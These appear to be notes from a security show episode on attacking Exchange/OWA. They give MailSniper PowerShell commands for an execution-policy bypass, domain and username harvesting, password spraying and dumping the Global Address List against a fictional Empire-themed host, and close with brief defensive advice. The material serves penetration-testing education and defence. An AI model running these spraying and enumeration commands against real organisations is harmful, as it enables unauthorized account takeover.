Attacking Exchange/OWA to Gain Access to AD Accounts – Tradecraft Security Weekly #3

# The Exchange Attack Surface 
- Extremely rare for orgs to not rely on email heavily
- Exchange and O365 are the most popular
- These services are commonly tied to an AD infrastructure
- Usually exposed to the Internet for Webmail usage

# Steps to Compromise
- Recon to discover usernames
- Discovery of mail server
- Internal domain enumeration
- Username enumeration
- Password spraying
- Get the Global Access List
- More password spraying

# MailSniper
https://github.com/dafthack/MailSniper
- Invoke-DomainHarvestOWA
- Invoke-UsernameHarvestOWA
- Inoke-PasswordSprayOWA
- Get-GlobalAddressList
```
C:\ powershell.exe -exec bypass
PS> Import-Module .\MailSniper.ps1
```
create potential domainlist to find internal domain name
```
PS > Invoke=DomainHarvestOWA -ExchHostname deathstar-mail.corp.empire.com -DomainList C:\temp\domainlist.txt -OutFile potential-domains.txt
```
Create a userlist file of potential users we have enumerated then pass it to the domainname we found above
```
PS> Invoke-UsernameHarvestOWA -ExchHostname deathstar-mail.corp.empire.com -UserList C:\temp\userlist.txt -DOMAIN EMPIRE
```
Password spray against found usernames
```
PS> Invoke-PasswordSprayOWA -ExchHostname deathstar-mail.corp.empire.com -DOMAIN EMPIRE -UserList C:\temp\userlist.txt -Password Spring2017
```
Use valid credential to grab the global name list
```
PS> Get-GlobalAddressList -ExchHostname deathstar-mail.corp.empire.com -UserName EMPIRE\found-creduser -Password Spring2017 -OutFile gal.txt
```
rinse and repeat

# For the Blues
- Lock down any Exchange services (like EWS, or MAPI over HTTP) that are not needed
- Ensure your 2FA software is covering all services
- Alert on password spraying; identify compromised user accounts and change their passwords immediately


























